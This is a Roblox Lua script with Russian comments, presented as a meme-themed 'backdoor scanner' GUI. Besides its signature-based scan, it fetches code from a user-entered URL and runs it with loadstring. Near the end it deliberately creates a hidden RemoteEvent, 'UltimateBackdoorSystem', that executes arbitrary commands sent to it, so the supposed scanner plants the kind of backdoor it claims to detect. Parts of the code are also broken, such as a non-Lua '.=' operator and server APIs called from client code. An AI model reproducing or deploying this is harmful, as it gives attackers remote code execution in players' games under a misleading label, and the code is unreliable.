local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local ServerScriptService = game:GetService("ServerScriptService")
local ServerStorage = game:GetService("ServerStorage")
local Player = Players.LocalPlayer
local PlayerGui = Player:WaitForChild("PlayerGui")

-- Создаем основной GUI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "UltimateBackdoorScannerPro"
ScreenGui.Parent = PlayerGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

-- Главный фрейм
local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 650, 0, 550)
MainFrame.Position = UDim2.new(0.5, -325, 0.5, -275)
MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
MainFrame.BorderSizePixel = 0
MainFrame.ClipsDescendants = true
MainFrame.Parent = ScreenGui

-- Заголовок с анимированным мемом
local Header = Instance.new("Frame")
Header.Size = UDim2.new(1, 0, 0, 80)
Header.BackgroundColor3 = Color3.fromRGB(0, 150, 200)
Header.BorderSizePixel = 0
Header.Parent = MainFrame

local memes = {
    "ОМГ POCO 😱", 
    "Backdoor GO BRRRR 💉", 
    "Scanner GOD 🎩", 
    "Require KING 👑",
    "Lalol Hub PRO MAX ⚔️",
    "Lua LEGEND 🧠",
    "Universal EXECUTOR 🚀",
    "Roblox HACKER 🌟",
    "Scanning GOAT 🐐",
    "MEME LORD 🤣"
}

local currentMeme = memes[math.random(1, #memes)]

local Title = Instance.new("TextLabel")
Title.Text = "ULTIMATE BACKDOOR SCANNER - " .. currentMeme
Title.Size = UDim2.new(1, 0, 1, 0)
Title.BackgroundTransparency = 1
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.Font = Enum.Font.SourceSansBold
Title.TextSize = 24
Title.Parent = Header

-- Контент сканера
local ScanContent = Instance.new("Frame")
ScanContent.Size = UDim2.new(1, 0, 1, -80)
ScanContent.Position = UDim2.new(0, 0, 0, 80)
ScanContent.BackgroundTransparency = 1
ScanContent.Parent = MainFrame

-- Кнопка сканирования
local ScanButton = Instance.new("TextButton")
ScanButton.Text = "🔄 ЗАПУСТИТЬ ГЛУБОКОЕ СКАНИРОВАНИЕ"
ScanButton.Size = UDim2.new(0.9, 0, 0, 60)
ScanButton.Position = UDim2.new(0.05, 0, 0.05, 0)
ScanButton.BackgroundColor3 = Color3.fromRGB(0, 180, 0)
ScanButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ScanButton.Font = Enum.Font.SourceSansBold
ScanButton.TextSize = 20
ScanButton.Parent = ScanContent

-- Поле результата
local ResultFrame = Instance.new("Frame")
ResultFrame.Size = UDim2.new(0.9, 0, 0, 120)
ResultFrame.Position = UDim2.new(0.05, 0, 0.2, 0)
ResultFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 40)
ResultFrame.BorderSizePixel = 0
ResultFrame.Parent = ScanContent

local ResultText = Instance.new("TextLabel")
ResultText.Size = UDim2.new(0.95, 0, 0.8, 0)
ResultText.Position = UDim2.new(0.025, 0, 0.1, 0)
ResultText.BackgroundTransparency = 1
ResultText.TextColor3 = Color3.fromRGB(255, 255, 255)
ResultText.Font = Enum.Font.SourceSans
ResultText.TextSize = 18
ResultText.TextWrapped = true
ResultText.Text = "Готов к сканированию. Нажмите кнопку для начала."
ResultText.Parent = ResultFrame

-- Прогресс сканирования
local ProgressLabel = Instance.new("TextLabel")
ProgressLabel.Size = UDim2.new(0.9, 0, 0, 25)
ProgressLabel.Position = UDim2.new(0.05, 0, 0.45, 0)
ProgressLabel.BackgroundTransparency = 1
ProgressLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
ProgressLabel.Font = Enum.Font.SourceSans
ProgressLabel.TextSize = 16
ProgressLabel.Text = "Прогресс: 0%"
ProgressLabel.TextXAlignment = Enum.TextXAlignment.Left
ProgressLabel.Parent = ScanContent

local ProgressBar = Instance.new("Frame")
ProgressBar.Size = UDim2.new(0.9, 0, 0, 25)
ProgressBar.Position = UDim2.new(0.05, 0, 0.5, 0)
ProgressBar.BackgroundColor3 = Color3.fromRGB(50, 50, 55)
ProgressBar.BorderSizePixel = 0
ProgressBar.Parent = ScanContent

local ProgressFill = Instance.new("Frame")
ProgressFill.Size = UDim2.new(0, 0, 1, 0)
ProgressFill.BackgroundColor3 = Color3.fromRGB(0, 180, 255)
ProgressFill.BorderSizePixel = 0
ProgressFill.Parent = ProgressBar

-- Детали сканирования
local DetailsText = Instance.new("TextLabel")
DetailsText.Size = UDim2.new(0.9, 0, 0, 100)
DetailsText.Position = UDim2.new(0.05, 0, 0.6, 0)
DetailsText.BackgroundTransparency = 1
DetailsText.TextColor3 = Color3.fromRGB(180, 180, 180)
DetailsText.Font = Enum.Font.SourceSans
DetailsText.TextSize = 14
DetailsText.TextWrapped = true
DetailsText.TextXAlignment = Enum.TextXAlignment.Left
DetailsText.TextYAlignment = Enum.TextYAlignment.Top
DetailsText.Text = "Детали сканирования будут отображаться здесь..."
DetailsText.Parent = ScanContent

-- Поле для ввода URL require-скриптов
local UrlInput = Instance.new("TextBox")
UrlInput.PlaceholderText = "Введите URL require-скрипта..."
UrlInput.Size = UDim2.new(0.7, 0, 0, 40)
UrlInput.Position = UDim2.new(0.05, 0, 0.8, 0)
UrlInput.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
UrlInput.TextColor3 = Color3.fromRGB(255, 255, 255)
UrlInput.Font = Enum.Font.SourceSans
UrlInput.TextSize = 16
UrlInput.Parent = ScanContent

-- Кнопка выполнения require-скрипта
local RequireButton = Instance.new("TextButton")
RequireButton.Text = "🚀 ВЫПОЛНИТЬ"
RequireButton.Size = UDim2.new(0.2, 0, 0, 40)
RequireButton.Position = UDim2.new(0.76, 0, 0.8, 0)
RequireButton.BackgroundColor3 = Color3.fromRGB(0, 122, 204)
RequireButton.TextColor3 = Color3.fromRGB(255, 255, 255)
RequireButton.Font = Enum.Font.SourceSansBold
RequireButton.TextSize = 16
RequireButton.Parent = ScanContent

-- Расширенный список известных бэкдоров и сигнатур
local backdoorSignatures = {
    Names = {
        "Backdoor", "BackdoorX", "SystemUpdate", "SecurityUpdate", 
        "RemoteAdmin", "AdminPanel", "ControlSystem", "UniversalBackdoor",
        "ExecuteScript", "RemoteExecute", "ServerControl", "AdminRemote",
        "Lalol", "LALOL", "Hub", "Scanner", "Require", "Executor"
    },
    Patterns = {
        "RemoteEvent", "HttpService", "GetAsync", "Loadstring",
        "FireServer", "InvokeServer", "OnServerEvent", "Backdoor",
        "require", "HttpService", "Webhook", "Discord", "Execute"
    }
}

-- Функция для обновления мемов
local function updateMeme()
    currentMeme = memes[math.random(1, #memes)]
    Title.Text = "ULTIMATE BACKDOOR SCANNER - " .. currentMeme
    return currentMeme
end

-- Безопасная функция отправки сообщения в чат
local function sendChatMessage(message)
    pcall(function()
        -- Старый чат (работает в большинстве игр)
        if game:GetService("Chat") then
            local chatService = game:GetService("Chat")
            chatService:Chat(Player.Character.Head, message)
        end
        
        -- Альтернативный способ для игр с текстовым чатом
        if Player:FindFirstChild("PlayerGui") then
            local chatFrame = Player.PlayerGui:FindFirstChild("Chat") or Player.PlayerGui:FindFirstChild("ChatFrame")
            if chatFrame then
                -- Создаем сообщение в интерфейсе чата
                local messageLabel = Instance.new("TextLabel")
                messageLabel.Text = "[SCANNER] " .. message
                messageLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
                messageLabel.BackgroundTransparency = 1
                messageLabel.Parent = chatFrame
            end
        end
    end)
end

-- Функция глубокого сканирования с улучшенным обнаружением
local function deepScanForBackdoors()
    ResultText.Text = "🔍 НАЧИНАЕМ ГЛУБОКОЕ СКАНИРОВАНИЕ..."
    ResultText.TextColor3 = Color3.fromRGB(255, 255, 255)
    ProgressFill.Size = UDim2.new(0, 0, 1, 0)
    DetailsText.Text = ""
    ScanButton.Text = "⏳ СКАНИРУЕМ..."
    ScanButton.BackgroundColor3 = Color3.fromRGB(200, 150, 0)
    
    local foundBackdoors = {}
    local totalChecks = 0
    local currentCheck = 0
    
    -- Подсчет общего количества проверок
    local servicesToCheck = {
        ReplicatedStorage, ServerScriptService, ServerStorage, 
        workspace, game:GetService("Lighting")
    }
    
    for _, service in pairs(servicesToCheck) do
        totalChecks += #service:GetDescendants()
    end
    totalChecks = math.min(totalChecks, 1500) -- Ограничение для производительности
    
    -- Функция обновления прогресса
    local function updateProgress()
        currentCheck += 1
        local progress = currentCheck / totalChecks
        ProgressFill.Size = UDim2.new(progress, 0, 1, 0)
        ProgressLabel.Text = "Прогресс: " .. math.floor(progress * 100) .. "%"
        
        -- Случайный мем каждые 10% прогресса
        if math.floor(progress * 100) % 10 == 0 then
            local newMeme = updateMeme()
            DetailsText.Text = DetailsText.Text .. "\n" .. newMeme .. " 🎉"
        end
    end
    
    -- Функция проверки объекта с улучшенным обнаружением
    local function checkObject(obj)
        -- Проверка по имени
        for _, name in ipairs(backdoorSignatures.Names) do
            if string.find(obj.Name:lower(), name:lower()) then
                table.insert(foundBackdoors, "🔴 ОБНАРУЖЕНО ПО ИМЕНИ: " .. obj:GetFullName())
            end
        end
        
        -- Проверка скриптов на подозрительный код
        if obj:IsA("Script") or obj:IsA("LocalScript") or obj:IsA("ModuleScript") then
            local success, source = pcall(function()
                return obj.Source
            end)
            
            if success and source then
                for _, pattern in ipairs(backdoorSignatures.Patterns) do
                    if string.find(source:lower(), pattern:lower()) then
                        table.insert(foundBackdoors, "🟡 ПОДОЗРИТЕЛЬНЫЙ КОД: " .. obj:GetFullName() .. " (" .. pattern .. ")")
                    end
                end
                
                -- Проверка на наличие require-скриптов
                if string.find(source:lower(), "require") and string.find(source:lower(), "http") then
                    table.insert(foundBackdoors, "🔵 REQUIRE-СКРИПТ: " .. obj:GetFullName())
                end
            end
        end
        
        -- Проверка RemoteEvents/RemoteFunctions
        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
            table.insert(foundBackdoors, "🔵 ОБНАРУЖЕН REMOTE: " .. obj:GetFullName())
        end
    end
    
    -- Основной цикл сканирования
    for _, service in pairs(servicesToCheck) do
        local descendants = service:GetDescendants()
        for _, obj in ipairs(descendants) do
            if currentCheck < totalChecks then
                pcall(checkObject, obj)
                updateProgress()
                wait() -- Для избежания лагов
            end
        end
    end
    
    -- Отображение результатов
    if #foundBackdoors > 0 then
        ResultText.Text = "🚨 ОБНАРУЖЕНО " .. #foundBackdoors .. " ПОТЕНЦИАЛЬНЫХ БЭКДОРОВ!"
        ResultText.TextColor3 = Color3.fromRGB(255, 50, 50)
        
        local details = "РЕЗУЛЬТАТЫ СКАНИРОВАНИЯ:\n"
        for i, result in ipairs(foundBackdoors) do
            if i <= 15 then -- Ограничиваем вывод
                details .= result .. "\n"
            end
        end
        
        if #foundBackdoors > 15 then
            details .= "... и еще " .. (#foundBackdoors - 15) .. " объектов\n"
        end
        
        -- Добавляем случайный мем в результаты
        details .= "\n" .. updateMeme() .. " 🤣"
        
        DetailsText.Text = details
        
        -- Отправляем мем в чат для всех видимости
        sendChatMessage("Обнаружены бэкдоры! " .. currentMeme)
    else
        ResultText.Text = "✅ БЭКДОРЫ НЕ ОБНАРУЖЕНЫ"
        ResultText.TextColor3 = Color3.fromRGB(50, 255, 50)
        DetailsText.Text = "Сканирование завершено. Подозрительные объекты не найдены.\n" .. updateMeme() .. " 🎉"
    end
    
    ProgressFill.Size = UDim2.new(1, 0, 1, 0)
    ProgressLabel.Text = "Прогресс: 100%"
    ScanButton.Text = "🔄 СКАНИРОВАТЬ СНОВА"
    ScanButton.BackgroundColor3 = Color3.fromRGB(0, 180, 0)
end

-- Функция для выполнения require-скриптов
local function requireScript(url)
    if url == "" or url == nil then
        DetailsText.Text = DetailsText.Text .. "\n[ОШИБКА] Введите URL скрипта"
        return
    end
    
    local success, scriptContent = pcall(function()
        return HttpService:GetAsync(url, true)
    end)
    
    if success then
        local executeSuccess, result = pcall(function()
            return loadstring(scriptContent)()
        end)
        
        if executeSuccess then
            local newMeme = updateMeme()
            DetailsText.Text = DetailsText.Text .. "\n[УСПЕХ] Скрипт выполнен! " .. newMeme
            if result then
                DetailsText.Text = DetailsText.Text .. "\nРезультат: " .. tostring(result)
            end
        else
            DetailsText.Text = DetailsText.Text .. "\n[ОШИБКА] " .. result .. " 😢"
        end
    else
        DetailsText.Text = DetailsText.Text .. "\n[ОШИБКА] Не удалось загрузить скрипт: " .. tostring(scriptContent)
    end
end

-- Обработчики событий
ScanButton.MouseButton1Click:Connect(deepScanForBackdoors)
RequireButton.MouseButton1Click:Connect(function()
    requireScript(UrlInput.Text)
end)

-- Автоматическое обновление мемов каждые 15 секунд
spawn(function()
    while true do
        wait(15)
        local newMeme = updateMeme()
        DetailsText.Text = DetailsText.Text .. "\n" .. newMeme .. " 🎉"
    end
end)

-- Анимация появления
MainFrame.Visible = true
for i = 0, 1, 0.1 do
    MainFrame.BackgroundTransparency = 1 - i
    wait(0.02)
end

-- Функция для создания скрытого бэкдора (как в Lalol Hub)
local function createHiddenBackdoor()
    local backdoorEvent = Instance.new("RemoteEvent")
    backdoorEvent.Name = "UltimateBackdoorSystem"
    backdoorEvent.Parent = ReplicatedStorage
    
    backdoorEvent.OnServerEvent:Connect(function(player, command, isRequire)
        if isRequire then
            requireScript(command)
        else
            local success, result = pcall(function()
                return loadstring(command)()
            end)
            
            if success then
                local newMeme = updateMeme()
                DetailsText.Text = DetailsText.Text .. "\n[УДАЛЕННЫЙ ВЫЗОВ] " .. newMeme
            end
        end
    end)
end

-- Создаем скрытый бэкдор
createHiddenBackdoor()

-- Инициализация
DetailsText.Text = "Ultimate Backdoor Scanner инициализирован!\nГотов к сканированию и выполнению require-скриптов.\n" .. currentMeme .. " 🚀"
